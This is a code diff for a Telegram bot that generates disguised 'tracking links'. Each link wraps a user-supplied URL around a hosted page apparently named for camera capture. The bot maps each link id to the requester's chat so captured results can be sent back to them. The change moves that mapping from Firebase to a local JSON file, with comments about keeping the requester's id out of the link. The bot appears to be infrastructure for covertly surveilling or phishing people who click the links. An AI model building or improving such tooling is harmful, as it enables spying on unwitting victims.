@@ -1,7 +1,8 @@
 import logging
 import uuid
 import base64
-import requests
+import json
+import os
 from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
 from telegram.error import TelegramError
@@ -13,16 +14,21 @@ logging.basicConfig(
 
 RENDER_BASE_URL = "https://camera-y1vl.onrender.com"
 CHANNEL_USERNAME = "@TeamLolOfficial"
-FIREBASE_DB_URL = "https://lolsms-39057-default-rtdb.firebaseio.com"
+MAPPING_FILE = "mappings.json"
 
-# ফায়ারবেসে ম্যাপিং সেভ করার ফাংশন
-def save_mapping_to_firebase(unique_id, chat_id):
-    try:
-        url = f"{FIREBASE_DB_URL}/mappings/{unique_id}.json"
-        data = {"chat_id": str(chat_id)}
-        requests.put(url, json=data)
-    except Exception as e:
-        logging.error(f"Firebase save error: {e}")
+# JSON ফাইল লোড বা সেভ করার ফাংশন
+def save_mapping(unique_id, chat_id):
+    data = {}
+    if os.path.exists(MAPPING_FILE):
+        try:
+            with open(MAPPING_FILE, "r") as f:
+                data = json.load(f)
+        except Exception:
+            data = {}
+    
+    data[unique_id] = str(chat_id)
+    with open(MAPPING_FILE, "w") as f:
+        json.dump(data, f)
 
 async def check_channel_membership(bot, user_id):
     try:
@@ -104,9 +110,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode()
         unique_id = str(uuid.uuid4())[:6]
         
-        # ফায়ারবেসে ডাটা সেভ করা হচ্ছে
-        save_mapping_to_firebase(unique_id, user_id)
+        # Mapping save করা হচ্ছে যাতে লিংকে কোনো আইডি না থাকে
+        save_mapping(unique_id, user_id)
         
+        # লিংকে শুধু id এবং url থাকবে, কোনো id/cid শো করবে না
         tracking_link = f"{RENDER_BASE_URL}/?id={unique_id}&url={encoded_url}"
         
         response_msg = (
@@ -132,5 +139,5 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
-    print("Firebase Mapped Dynamic link bot is running...")
+    print("JSON Mapped Dynamic link bot is running...")
     application.run_polling()
